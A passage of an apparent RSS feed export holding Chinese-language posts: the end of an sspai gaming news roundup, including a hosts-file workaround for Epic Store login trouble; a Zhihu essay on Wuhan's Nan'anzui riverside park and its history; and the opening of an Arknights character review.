href=\"https://blog.playstation.com/2021/06/29/welcoming-housemarque-to-the-playstation-studios-family/\">Housemarque</a><strong> </strong>工作室。</li>\n<li>\n<a href=\"https://twitter.com/timistudios/status/1407797718366384129\">腾讯</a> 成立天美西雅图工作室，专攻 3A 级别 FPS 游戏。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/e3582d22ad8b0e918f0ce7b7e5a33efd.jpeg\"></figure><ul>\n<li>\n<a href=\"https://twitter.com/N_Officialstore/status/1407885413881159682\">任天堂</a> 将通过快闪店，以扭蛋机的形式发售一套红白机、NES 主题的周边挂件，单个售价 500 日元，外形小巧可爱。</li>\n<li>国行 Switch《马力欧卡丁车 8 豪华版》<a href=\"https://weibo.com/7229718199/KmrZJqJi5\">海选赛</a> 结束，16 支战队晋级 <a href=\"https://weibo.com/7229718199/Kmrso8Ta9\">常规赛</a>，7 月 2 日到 18 日将全程 <a href=\"https://weibo.com/7229718199/KmrJAxrZp\">直播</a>。</li>\n<li>国行 Switch《<a href=\"https://weibo.com/7229718199/KmoI4a1Z6\">耀西的手工世界</a>》将于 7 月 9 日发售，官方建议零售价 299 元。</li>\n<li>Switch 版《<a href=\"https://www.nintendo.com/games/detail/sky-children-of-the-light-switch/\">Sky 光遇</a>》现已上架，可免费游玩，大小为 2.5GB，支持中文，并支持跨平台联机。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/5a0cfcb6f3246e293834809eca1674a5.jpeg\"><figcaption>图源 <a href=\"https://www.reddit.com/r/AyyMD/comments/c0peex/worlds_most_powerful_memes_are_powered_by_amd/\">reddit DingoKis</a></figcaption></figure><ul>\n<li>AMD FSR 技术支持的游戏和 GPU，还有实测效果对比，推荐阅读少数派两位作者@Tiger5G 和@广陵止息 联合创作的文章《<a href=\"https://sspai.com/post/67469\">老显卡也能拥有的新体验：AMD FSR 实测</a>》。即使 Nvidia 家的 GTX 1060 老显卡也能使用 AMD FSR 技术。</li>\n<li>AMD FSR 技术已支持 <a href=\"https://twitter.com/jronald/status/1408156048179879936\">微软</a> 的 Xbox Series X|S 和 Xbox One。</li>\n<li>《Baba is You》登录 <a href=\"https://play.google.com/store/apps/details?id=org.hempuli.baba\">Android</a> 与 <a href=\"https://itunes.apple.com/us/app/id1517281887\">iOS</a> 平台，售价 6.99 美元。</li>\n<li>《<a href=\"https://www.monsterhunter.com/stories2/cn/topics/demo/\">怪物猎人物语 2：破灭之翼</a>》的免费试玩版现已上架 Switch eShop 商店，Steam 版将于 7 月 9 日发布。</li>\n</ul>\n<h2>彩蛋</h2>\n<h3>🌈🥚1 Switch 版《<a href=\"https://www.nintendo.com/games/detail/calculator-switch/\">计算器</a>》史低了：-80% 折扣，美服 1.99 美元（原价 9.99 美元），约合人民币 12.71 元</h3>\n<p>不过全球最低价在波兰区，售价 7.20 兹罗提，约合人民币 12.49 元。</p>\n<p>作为一款终极炒冷饭作品，上手门槛低，全开放结局，自由度极高。</p>\n<p>希望开发者后续能推出 DLC，加入按键中文语音提示，以实现瞎玩菌最期待的「归归归归归归归零」玩法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/e512944e12b3490dcfb7187f15594ff3.jpeg\"></figure><h3>🌈🥚2 针对部分用户无法领取 Epic 商城免费游戏的解决办法</h3>\n<p>根据 <a href=\"https://weibo.com/7287111107/Km95fF3Ob\">Epic 游戏商城</a> 官方微博，含四川电信在内的部分用户无法登录以领取免费游戏。经调查是在hCaptcha验证时出问题了。<a href=\"https://weibo.com/7287111107/KmfftkcHC\">解决办法</a> 是在 hosts 文件里加入以下内容：</p>\n<pre class=\"language-null\"><code>104.16.168.131 hcaptcha.com\n104.16.168.131 newassets.hcaptcha.com\n104.16.168.131 imgs.hcaptcha.com</code></pre>\n<p>望 PC 玩家朋友们互相转告。</p>\n<h3>🌈🥚3 日本玩家用 Switch 游戏《附带导航！一做就上手第一次的游戏程序设计》自制脑洞竞速游戏</h3>\n<p>游戏的主角是一只会漂移的 Joy-con 手柄。注意漂移是指漂移过弯，不是你们想的那样。</p>\n<p>想玩的话可以查找游戏 ID：G 008 KG3 73F</p>\n<p>操作方式：左摇杆控制方向，右摇杆控制加速，按键漂移。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/8d74d493a1d42c37cbfeb9acd176c173.gif\"><figcaption>游戏录屏。图源 <a href=\"https://twitter.com/puchipuchi3g/status/1405653927446470656\">Twitter ぷちぷち@まったりマイペース</a></figcaption></figure><h3>🌈🥚4 索尼克 30 周年，微软、世嘉联合搞纪念活动</h3>\n<p>2021 年 6 月 23 日是索尼克 30 周年的日子。在 30 年前，世嘉主机上发布了《刺猬索尼克》，开启了游戏的新纪元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/05ed09169ff84a76aa21276b786d2fde.jpg\"></figure><p>《我的世界》推出了与世嘉官方联动的 DLC 「索尼克」（官方宣传视频：<a href=\"https://www.youtube.com/watch?v=5Mb9ijO_740\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1XV411s75h\">哔哩哔哩</a>）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/38dd9af985139b759cd5d1c6bfc7f2ef.jpeg\"></figure><p>世嘉举办了《索尼克 30 周年音乐会》（全程视频：<a href=\"https://www.youtube.com/watch?v=UGTlBHNvjsU\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1a64y197s4\">哔哩哔哩</a>）。</p>\n<h3>🌈🥚5 <a href=\"https://twitter.com/nguyenhut_art/status/1406938568489013253\">动森玩家</a> 自制同人图，点击链接还能欣赏到一小段 3D 动画</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/fe7a6d4ed33820aaf3e307b71f1af8e2.jpeg\"><figcaption>图源 <a href=\"https://twitter.com/nguyenhut_art/status/1407004622007390210\">Twitter Nguyen Nhut</a></figcaption></figure><h3>🌈🥚6 《赛博朋克酒保行动》玩家二创游戏《Jill's Day》体验版</h3>\n<p>为了给原作主角 Jill 庆祝生日，<a href=\"https://twitter.com/takuyahasonmin/status/1408802229914533888\">玩家</a> 自制了这款 GameBoy 画风的网页游戏，位于 <a href=\"https://guanoice.itch.io/jillsdaydemo\">itch.io</a>，你可以使用浏览器免费游玩。</p>\n<p>目前仅支持日文，但开发者称已经找到了 3 位英文翻译志愿者。</p>\n<p>对于没玩过《赛博朋克酒保行动》（VA-11 Hall-A: Cyberpunk Bartender Action）的朋友，你可以在 XGP 库里找到这款真正的赛博朋克游戏，并且官方支持中文。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/ddebbe7719eb1e97b509133f1a612daa.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/833412cf4219ce6b0e09547d393a60d8.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/d7ade5782e0658ac99ffb6043a32874d.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/3383c413060c86f0745d63fd70be7c98.png\"></figure><p>📧 纠错/反馈/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67484"},{"title":"武汉有哪些隐藏在城市深处的小众古迹？","date":"2021-07-02 06:45:08","description":"\n<p><b>【野岛乐园南岸嘴】</b><br></p>\n<p>南岸嘴衔住一清一浊，180亩野岛藏着令人心旌荡漾的平价夏天，它是一块穿越旧时光的城中飞地，不办一场户外音乐节，实在可惜。</p>\n<p><br></p>\n<p>武汉许多地方，久仰大名、却从未去过。南岸嘴是其一。</p>\n<p><b>长江和汉水在南岸嘴相遇。</b>龟山的绿意葱茏往江心延伸出一块绿色半岛，汉水绕过半岛尖尖汇入长江。南岸嘴就是那块半岛。</p>\n<p><b>这里是武汉人不敢妄动的一块地。</b>1998年以前，南岸嘴住满人。抗洪之后，修堤治水，老居民全部搬离。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-94583e264e10b5d9cc9a7b5498a3e995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"3243\" data-watermark=\"original\" data-original-src=\"v2-94583e264e10b5d9cc9a7b5498a3e995\" data-watermark-src=\"v2-231f305e19e34ade81c00a88b818115a\" data-private-watermark-src=\"v2-206c6ff8d954dbcfa5fcf270ad658a30\"></p>\n<p><br></p>\n<p>两江交汇核心地段，上海陆家嘴集齐三件套，重庆朝天门扬起百亿“风帆”来福士，我们南岸嘴就不一样了，<b>“闲置”20多年，不种高楼，专注种树，至今仍是一座绿色滨江公园。</b></p>\n<p>一次办公室闲聊，同事说他招待外地朋友玩武汉，南岸嘴是必去的一站，“去了每个人都哇哇惊叹，屡试不爽。”</p>\n<p>今年夏天，我第一次“登岛”南岸嘴，同事所言不虚，<b>仿佛误入80、90年代的武汉，一座充斥旧浪漫的野趣乐园。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8f16df17ad7293e8e1319af51aa16dc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"188\" data-watermark=\"original\" data-original-src=\"v2-8f16df17ad7293e8e1319af51aa16dc4\" data-watermark-src=\"v2-59b22a400f013031da5c18a56ead8128\" data-private-watermark-src=\"v2-8cdcf2b9e822056d8f16cc42bff74bd1\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2878711a541ee431d9c1859e72acc7c0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-2878711a541ee431d9c1859e72acc7c0\" data-watermark-src=\"v2-77608542cad43a2647f33e254bf5e479\" data-private-watermark-src=\"v2-500ee6efa6c6afa9787f182a67e50940\"></p>\n<p><br></p>\n<p>南岸嘴江滩公园入口没有招牌。跟着导航七弯八拐，穿过两根贴瓷砖的大白柱，就算进了公园。泥土和树叶香气扑面，往深处走近河堤，闻到淡淡藻腥。</p>\n<p><br></p>\n<p>作为一个城市中央的公园，<b>南岸嘴没有标配的健身器材，全靠自娱自乐。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a4225bdf601e4c3a5aac02d85493328b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-a4225bdf601e4c3a5aac02d85493328b\" data-watermark-src=\"v2-5f74f073cc28c1fe6bfd79bd3148e0d7\" data-private-watermark-src=\"v2-e469e46c00b680c1f637c9dcb92f3564\"></p>\n<p><br></p>\n<p><b>空地画白线，便有了网球场</b>，绿树环绕，自带水景，折服于民间智慧。</p>\n<p>晴川桥下，一条泳裤扎进夏天。空手而来，黑轮胎救生圈十元一租，<b>泳衣现场购买，随到随玩。</b>没有更衣室，临时起意的T恤牛仔裤在河堤堆成小山，白袜子塞进棕色皮凉拖。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e816f943a076ec5165225575ace3a9ee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-e816f943a076ec5165225575ace3a9ee\" data-watermark-src=\"v2-18c593cb92f9846eb9af22f98ad4b6a3\" data-private-watermark-src=\"v2-e718c1d244c457399d78680f41629bb8\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4bec2a5b6d7a303eae598716f7fc9076_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-4bec2a5b6d7a303eae598716f7fc9076\" data-watermark-src=\"v2-27cac5eeb016b86a684dcea59e7c1c4c\" data-private-watermark-src=\"v2-4b9a699c6d0b95f384328d2ad985cb2f\"></p>\n<p><br></p>\n<p>打气球，十元一盘，长发及腰的女老板鼓起腮帮子吹气球，播放上世纪的动次打次，在夜幕降临时与对岸 IM HAN 酒吧隔岸和鸣。</p>\n<p><b>街头游戏仅需10元。爱情免费。</b></p>\n<p>江堤上的人在夜里分两派：一人一竿的钓友，成双成对的恋人。</p>\n<p>恋人们相互依偎，看黄鹤楼点亮，二七桥、二桥、大桥、鹦鹉洲、杨泗港依次璀璨。面朝绿地中心，背靠龟山电视塔，<b>平视这座城市从今往后的天际线，仰望此刻的月亮和历代的星辰。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-fb16bb959be46dcc44657a69567e9afd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-fb16bb959be46dcc44657a69567e9afd\" data-watermark-src=\"v2-f39468465b9ea2da05a596235ad874bb\" data-private-watermark-src=\"v2-934815cad1a26c59fa272169d5646845\"></p>\n<p><br></p>\n<p>在南岸嘴，双目进化成鱼眼，<b>江景视野超300°开阔。这里听到的汽笛声比别处江滩大一些</b>，我以为是幻觉，问了许多人都有相同感受。</p>\n<p><b>南岸嘴衔住一清一浊，180亩野岛藏着令人心旌荡漾的平价夏天</b>，它是一块穿越旧时光的城中飞地，不办一场户外音乐节，实在可惜。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-65c69499fe1510f2e0f0f36ee5f1e9ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-65c69499fe1510f2e0f0f36ee5f1e9ad\" data-watermark-src=\"v2-7a19b453d04284cf7a8a8573f740ce9d\" data-private-watermark-src=\"v2-4a4e59907d827c7560c9d75683f1ae29\"></p>\n<p><br></p>\n<p>这里与武汉无限远，又无限近。<b>城市中央凭空长出一片森林</b>，出逃此地，又被江景壮阔和生猛野趣包围夹击。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-480d054d1e8d475c1bfde6f17a23e877_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"205\" data-watermark=\"original\" data-original-src=\"v2-480d054d1e8d475c1bfde6f17a23e877\" data-watermark-src=\"v2-5b781b2ced2fbefb84fee5d1e933f8fa\" data-private-watermark-src=\"v2-af9f5125d928424cd165f5378f3dc962\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6cb19ea8d5e39859ca37474042fb5c08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1592\" data-watermark=\"original\" data-original-src=\"v2-6cb19ea8d5e39859ca37474042fb5c08\" data-watermark-src=\"v2-39443a5b3846572f92f45ec96587ab1a\" data-private-watermark-src=\"v2-b81e1a65102964ec9db1423b58480e33\"></p>\n<p><br></p>\n<p>来寻乐的大多是汉阳居民。也有六渡桥拐子骑电动车来漂流，车后挂一黑轮胎，车前载一黑一黄两条田园犬，过桥就到，不远。</p>\n<p><b>人在车胎仰卧，顺水漂，狗在岸上跟着跑</b>，漂到南岸嘴起水，到树荫下走两盘棋。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d8b759dd36bd2f08c3e46c6463c16530_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-d8b759dd36bd2f08c3e46c6463c16530\" data-watermark-src=\"v2-c53711f8ee2859365f2ef052d4ca8f88\" data-private-watermark-src=\"v2-eec44bc57c038faafda56ede0eb5a435\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-248c5a04477676ada5ab4753b4239528_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1599\" data-watermark=\"original\" data-original-src=\"v2-248c5a04477676ada5ab4753b4239528\" data-watermark-src=\"v2-e7fbea022ab4fdeffa76db01d4688c5e\" data-private-watermark-src=\"v2-091d22e804d6b9f66f0edc9d7bb723ba\"></p>\n<p><br></p>\n<p><b>南岸嘴男子俱乐部，一个松散组织，或者说几乎没有组织。</b>没有微信群约时间，没有固定接头地点，沿堤岸支起鱼竿，先到先占据有利地形，席地摆开楚河汉界，棋逢对手一坐一下午。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e0991218545aa44a16b4112ecfcbbd61_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1614\" data-watermark=\"original\" data-original-src=\"v2-e0991218545aa44a16b4112ecfcbbd61\" data-watermark-src=\"v2-483edd5ecdf4c5e6cf0d9b317c9df1b4\" data-private-watermark-src=\"v2-d53e69724ee930ab27e09a0fb7274d82\"></p>\n<p><br></p>\n<p>多年混得脸熟，玩高兴了会在天黑之后约着喝点小酒，宵个夜再回家。至于下次何时相见，全靠有缘。</p>\n<p>住钟家村的男人，双肩包拉链伸出一把网球耙子，<b>他说这里是武汉的肺，一块宝地。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-89c1fa8f6d3c9918e40a49f6f163d026_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-89c1fa8f6d3c9918e40a49f6f163d026\" data-watermark-src=\"v2-76604b4dd6a8b939e0e694dec8701b7e\" data-private-watermark-src=\"v2-aa7986cdb6bf6ea3c2a75ee2367849d7\"></p>\n<p><br></p>\n<p>“南岸嘴”地名有典故，相传明朝嘉靖皇帝从安陆（今钟祥）赴京登基，乘船经此。官员百姓肃立汉水两岸，争相一睹龙颜，<b>接驾渡口被称为“接驾嘴”和“南岸接驾嘴”</b>，谐音流传成了“集家嘴”和“南岸嘴”。</p>\n<p>明清时期，南岸嘴连同汉口沿河一带是交通、商贸要津。1998年以前，这里是一片密集民居。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-beebd9509c225a11c93253075cf6946d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-beebd9509c225a11c93253075cf6946d\" data-watermark-src=\"v2-68f930b774997ef6e55832c3d4db9361\" data-private-watermark-src=\"v2-e6986801691a14aa9a54a78b80580f60\"></p>\n<p><br></p>\n<p>从龟北路国棉社区十分钟走到南岸嘴。高公街走到头，晴川桥桥墩下是从前的渣砖二巷。夏天爬船顶跳水，汛期过后，<b>蹲在退水的沙土堤挖铜钱</b>。这里的人记忆中都有一个消失于湍流的小伙伴，有人说是被码头趸船吸了去，有人说淹死的都是会游泳的。不会水的人不敢往江心。</p>\n<p>两江交汇处水患不断，洪峰过境，南岸嘴只剩一片红屋顶。1998年后，政府出资，2650余户居民迁至安全地带。<b>汉阳桃花岛城市花园小区，80%居民曾在南岸嘴生活。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5477d4c11bbae8545b1c03240223e138_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"742\" data-watermark=\"original\" data-original-src=\"v2-5477d4c11bbae8545b1c03240223e138\" data-watermark-src=\"v2-914447b417792083e080e8f5b7dadf4f\" data-private-watermark-src=\"v2-a40e64c32204c6ddba6ef7079f548c69\"></p>\n<p><br></p>\n<p>二十年前依依离别，原住“岛民”常会回家看看。<b>绿荫蔽日，已不是从前巷陌拥挤。对比两江对岸的华灯高楼，南岸嘴密林又仿佛停住了时间。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7ebffdac8353399594fe59fc5b8e992e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"193\" data-watermark=\"original\" data-original-src=\"v2-7ebffdac8353399594fe59fc5b8e992e\" data-watermark-src=\"v2-562928245822a4ebe577ac06c810043b\" data-private-watermark-src=\"v2-074e7de3152e7ad895ad80bb9719db62\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1e6978dc5e916008ad396b342176e388_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1464\" data-watermark=\"original\" data-original-src=\"v2-1e6978dc5e916008ad396b342176e388\" data-watermark-src=\"v2-4ea27710b345a1a83dd164ff7640f449\" data-private-watermark-src=\"v2-02d54c23976de6e25664772bf7ffdc3b\"></p>\n<p><br></p>\n<p><b>“谁不想打这里主意？这是蛮宝贵的地方啊，一般的开发商，想都莫想。”</b>家住郭茨口的白发爷爷，望着南岸嘴尖尖角，吐字有力。</p>\n<p>为了看这几天的灯光秀，爷爷搬塑料板凳，六点不到就到南岸嘴占位置，他说，孙姑娘今年四岁，没看过长江，“这里是看江最好的地方。”</p>\n<p><b>最后一批居民在2000年搬离。此后，南岸嘴规划多次列入“两会”议题。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-23957cda4aec05b3908e365b88ede3a7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\"></p>\n<p><br></p>\n<p><b>2001年，武汉面向全球征集南岸嘴规划</b>，在武展办了一场展览，展出来自东京、香港等地11个入围方案。南岸嘴出生长大的朱师傅和老朋友专程去看，有的说要建450米高金色龙塔，有的是酷似卢浮宫的水晶三角锥，还有片片白帆构筑的音乐厅……</p>\n<p>南岸嘴被誉为“中国角”，传说中国丹田在这里，其实是地形与“德国角”相似。德国科布伦茨，莱茵河与摩泽尔河交汇，德国角竖立着威廉一世雕像。</p>\n<p><b>武汉市民之家、琴台大剧院都曾考虑落址“中国角”。20多年过去，地标建筑没等来，南岸嘴依旧亭亭如盖。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-92f85469cf412d533f012f9a1d0b0fc5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-92f85469cf412d533f012f9a1d0b0fc5\" data-watermark-src=\"v2-547e0e204a45192b729c4b06a4ac83d2\" data-private-watermark-src=\"v2-f9f06beff4749a6d48c005df362bc6ad\"></p>\n<p><br></p>\n<p>有人惋惜南岸嘴冷清，也有人说武汉不缺地方盖楼，保留绿色滨水公园，蛮好。（要是路灯修好，公厕弄干净，更好）</p>\n<p>伸入江心的尖尖角是天然水位指标，<b>枯水期露出边缘参差的滩涂沙地，走上去离江心特别近。</b>夏天水涨至防护堤，画出一条平顺的弧。</p>\n<p>运送白砂的船只在龙王庙打舵入汉水，像利刃入喉，接近晴川桥时，依照岸边写有“鸣”字的指示牌，拉响汽笛。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e222841d26a2627262da0f451167644f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-e222841d26a2627262da0f451167644f\" data-watermark-src=\"v2-c53d4c47698dbb8fb60ae47893a71e21\" data-private-watermark-src=\"v2-b612ed8cc6097d5f02a40a1adeed338f\"></p>\n<p><br></p>\n<p>向武汉市规划局的朋友打探南岸嘴最新消息，回复是：“还没定，目前是不动。”</p>\n<p>也好。没想清楚，宁可不动。<b>留白总比留遗憾要好。</b></p>\n<p><br></p>\n<p>///</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-eb68b99059346d5c97d0bf0f01056997_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-eb68b99059346d5c97d0bf0f01056997\" data-watermark-src=\"v2-70fff652966bff1f4325e79497200bdc\" data-private-watermark-src=\"v2-195ea030f64756a55eb0318296209ac1\"></p>\n<p><br></p>\n<p>从武昌坐轮渡过江，大桥、电视塔、晴川桥，渐入眼帘。船行接近南岸嘴，心生好奇，突出的绿色半岛上面什么样？<b>怎么一清一浊交融了几百年还没混成一种颜色？</b></p>\n<p>没等回过神，船舷侧转，向江汉关驶去。</p>\n<p>汉水流至汉阳，在相当长一段时间里，并不存在一个稳定的入江口。放荡摇摆的汉水在明朝成化年间有了定性，择龟山北面注入长江。</p>\n<p>再后来，汉水以北诞生东方芝加哥，汉水以南的尖尖角，帆船点点停泊，<b>商贾百姓迎来送往，如今又回归芳草萋萋。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-cb83a16d9268dedd0b33f31216e6a4fd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1682\" data-watermark=\"original\" data-original-src=\"v2-cb83a16d9268dedd0b33f31216e6a4fd\" data-watermark-src=\"v2-89799b851113add84ed2c5360991a635\" data-private-watermark-src=\"v2-118295da4c92b45cdf0c853749fcf516\"></p>\n<p><br></p>\n<p>下午五点，穿黑色泳裤的大桥局电焊工，牵出不满半岁的马犬，到南岸嘴调教狗子水性。</p>\n<p>五点半，一家三口推冰箱到晴川桥下支摊，卖冰水和烤肠，等待六点，跑步团喊口号健步如飞。</p>\n<p>太阳落山后到南岸嘴，嗅觉是最先打开的感官，泥土草腥，因为除了江堤一带，夜晚这里几乎没有路灯，树多蚊子多。<b>热闹的灯光秀借给南岸嘴微弱的光，老婆婆说这样也好，“鸟不会核跑</b>（吓跑）<b>。”</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-916220113ff288bddbd433a1fb4d1919_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-916220113ff288bddbd433a1fb4d1919\" data-watermark-src=\"v2-685a37930e1af4caee7643a1785029a1\" data-private-watermark-src=\"v2-dd128e8805688e6b78c6c2c5d8bf2766\"></p>\n<p><br></p>\n<p>最近一次去南岸嘴是下午四点，<b>在晴川桥下发现三张蒙着布的台球桌</b>，积满灰。一个中年男人从一间孤零零的办公室伸出脑袋，递来球竿，“自己玩，不要钱，桌上有巧克。” 他说从前十元一盘，老板不做了，而后转动钥匙，跨着电动车扬长而去。</p>\n<p><br></p>\n<hr>\n<p><br></p>\n<p><b>  插播一则课外知识</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c25788e5dfd391a80204745642305983_720w.jpg?rss\" data-caption=\"●武汉南岸嘴影像对比（左图 1966年 右图 2019年）\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"original\" data-original-src=\"v2-c25788e5dfd391a80204745642305983\" data-watermark-src=\"v2-3bd58a509ecf4d3523470aaedea9aba9\" data-private-watermark-src=\"v2-babfbc035f067b5b119e17727da78a04\"></p>\n<p><br></p>\n<p>如今的南岸嘴面积比1998年以前“小”一些。</p>\n<p>1998年以前，汉水几乎是一个直角拐弯，撞向南岸嘴。1998年8月底，整治龙王庙水利工程开工，第一件事就是拆迁南岸嘴，拉直汉江河道。南岸嘴沿江削坡60米，还路于水，从前的直角转弯，变得缓和，水流也变得温顺。</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/hansyi-sheng-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">HANS汉声</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/451982188/answer/1970788130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">10 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/395157045?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉全员检测完成后会不会成为全国最安全的城市？</a><br><a href=\"http://www.zhihu.com/question/352383201?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">第一次到武汉，武汉是个怎样的城市呢？</a><br>\n","link":"http://www.zhihu.com/question/451982188/answer/1970788130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《明日方舟》新六星卡涅利安？","date":"2021-07-01 15:30:08","description":"\n<p>粗略地做了个卡涅利安的评测视频。她的定位是环法，常态高防，不开技能可以用作嘲讽吸引伤害，开技能时也有极高的DPS，清场秒人两不误。而且谁能拒绝埃及风小姐姐呢（</p>\n<hr>\n<p>第二个评测视频出来了，6人H7-4卡姐伤害测试，有兴趣可以移步观看</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a 